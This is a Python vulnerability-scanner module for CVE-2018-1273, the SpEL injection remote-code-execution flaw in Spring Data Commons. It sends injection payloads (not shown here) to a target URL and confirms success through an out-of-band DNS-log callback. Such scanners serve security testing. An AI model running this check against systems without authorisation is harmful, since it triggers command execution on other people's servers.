#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2018_1273_scan(self, url):
    ''' Spring Data是一个用于简化数据库访问, 并支持云服务的开源框架;
        Spring Data Commons是Spring Data下所有子项目共享的基础框架;
        Spring Data Commons 在2.0.5及以前版本中, 存在一处SpEL表达式注入漏洞, 
            攻击者可以注入恶意SpEL表达式以执行任意命令
    '''
    sessid = 'f638f51cbd7085fc19b791bb689ad7d7'
    
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2018-1273'
    # vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {}

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2018_1273_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)
        target = url + path

        headers['Referer'] = target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            sleep(3)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
